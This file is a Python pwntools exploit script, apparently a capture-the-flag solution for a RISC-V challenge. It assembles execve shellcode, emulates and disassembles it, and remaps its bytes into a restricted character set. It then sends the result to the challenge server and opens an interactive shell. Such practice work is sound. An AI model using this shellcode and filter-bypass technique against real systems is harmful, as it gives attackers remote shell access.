#! /usr/bin/python
from pwn import *
from unicorn import *
from unicorn.riscv_const import *
from capstone import *




context.update(
        arch="riscv64",
        endian="little",
        #log_level="debug",
        log_level="info",
        os="linux",
        terminal=["tmux", "split-window", "-h", "-p 65"]
        #terminal=["st"]
)
to = 2

ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)


allowed_chars = [bytes(chr(i), encoding="utf-8") for i in range(0x41, 0x4d)]


# callback for tracing instructions
def hook_code(uc, address, size, user_data):
    print(">>> Tracing instruction at 0x%x, instruction size = 0x%x" %(address, size))
    a0 = uc.reg_read(UC_RISCV_REG_A0)
    v0 = uc.reg_read(UC_RISCV_REG_X2)
    a1 = uc.reg_read(UC_RISCV_REG_A1)
    a2 = uc.reg_read(UC_RISCV_REG_A2)
    a3 = uc.reg_read(UC_RISCV_REG_A3)

    print(f"A0 = {hex(a0)}\nA1 = {hex(a1)}\nA2 = {hex(a2)}\nA3 = {hex(a3)}\nV0 = {hex(v0)}")


def unicorn_debug_mem_access(uc, access, address, size, value, user_data):
    if access == UC_MEM_WRITE:
        print(
            "        >>> Write: addr=0x{0:016x} size={1} data=0x{2:016x}".format(
                address, size, value
            )
        )
    else:
        print("        >>> Read: addr=0x{0:016x} size={1}".format(address, size))

def unicorn_debug_mem_invalid_access(uc, access, address, size, value, user_data):
    if access == UC_MEM_WRITE_UNMAPPED:
        print(
            "        >>> INVALID Write: addr=0x{0:016x} size={1} data=0x{2:016x}".format(
                address, size, value
            )
        )
    else:
        print(
            "        >>> INVALID Read: addr=0x{0:016x} size={1}".format(address, size)
        )


def emulate_shellcode(shellcode):

    uc = Uc(UC_ARCH_RISCV, UC_MODE_RISCV64)
    addr = 0x100000

    uc.mem_map(addr, 2 * 1024 * 1024)
    uc.mem_write(addr, shellcode)

    uc.hook_add(UC_HOOK_CODE, hook_code)
    uc.hook_add(UC_HOOK_MEM_WRITE, unicorn_debug_mem_access)
    uc.hook_add(UC_HOOK_MEM_READ, unicorn_debug_mem_access)
    uc.hook_add(UC_HOOK_MEM_WRITE_UNMAPPED | UC_HOOK_MEM_READ_INVALID,unicorn_debug_mem_invalid_access)

    try: 
        uc.emu_start(addr, addr + len(shellcode))
    except UcError as e:
        print(f"error: {e}")

def mod_shellcode(shellcode):
    shell = shellcode.replace(b"\x01", b"\x41")
    shell = shell.replace(b"\x08", b"\x42")
    shell = shell.replace(b"\x0d", b"\x43")
    shell = shell.replace(b"\x45", b"\x44")
    shell = shell.replace(b"\x46", b"\x45")
    shell = shell.replace(b"\x47", b"\x46")
    shell = shell.replace(b"\x48", b"\x47")
    shell = shell.replace(b"\x49", b"\x48")
    shell = shell.replace(b"\x65", b"\x49")
    shell = shell.replace(b"\x73", b"\x4a")
    shell = shell.replace(b"\x81", b"\x4b")
    shell = shell.replace(b"\x93", b"\x4c")
    shell = shell.replace(b"\xd0", b"\x4d")


    allowed_chars = [chr(i) for i in range(0x41, 0x4d)]
    print(allowed_chars)
    
    return shell


def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        b main
    '''

    #if args.GDB:
    #return gdb.debug(binary, gdbscript=gs)
    #elif args.REMOTE:
    return remote("spaceheroes-a-riscv-maneuver.chals.io", 443, ssl=True, sni="spaceheroes-a-riscv-maneuver.chals.io")
    #else:
        #return process(binary)


def exploit(p):

    addr_of_binsh = 0x12000

    assembly = """
        lui a0, 18
        
        li a1, 0
        li a2, 0
        li a3, 0
        li a4, 0
        li a5, 0
        li a6, 0

        li a7, 29
        addi a7, a7, 24
        addi a7, a7, 24
        addi a7, a7, 24
        addi a7, a7, 24
        addi a7, a7, 24
        addi a7, a7, 24
        addi a7, a7, 24
        addi a7, a7, 24

        ecall
    """

    shellcode = asm(assembly)

    print(shellcode, len(shellcode))

    md = Cs(CS_ARCH_RISCV, CS_MODE_RISCV64)
    md.detial = True 


    for i in md.disasm(shellcode, 0x1000):
        print("0x%x:\t%s\t%s" % (i.address, i.mnemonic, i.op_str))

    emulate_shellcode(shellcode)

    exp = mod_shellcode(shellcode)

    print(exp, len(exp))

    p.send(b'Z'*65)
    p.sendline(exp)
    p.interactive()
    

if __name__=="__main__":
    file = args.BIN


    p = start(file)
    #e = context.binary = ELF(file)
    #l = ELF("./libc.so.6")



    exploit(p)
